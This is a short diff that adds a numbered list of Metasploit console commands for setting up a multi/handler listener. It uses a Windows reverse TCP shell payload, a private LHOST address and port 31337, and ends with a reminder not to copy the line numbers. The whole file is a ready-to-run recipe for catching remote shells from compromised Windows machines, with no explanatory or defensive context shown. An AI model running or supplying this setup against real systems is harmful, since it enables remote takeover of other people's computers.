@@ -1,0 +1,12 @@
+1.msfconsole
+2.use exploit/multi/handler
+3.msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
+4.payload => windows/shell/reverse_tcp
+5.Show options
+6.msf exploit(multi/handler) > set LHOST 192.168.9.191
+7.LHOST => 192.168.9.191
+8.msf exploit(multi/handler) > set LPORT 31337
+9.LPORT => 31337
+10.msf exploit
+
+Note: don't copy the numbers
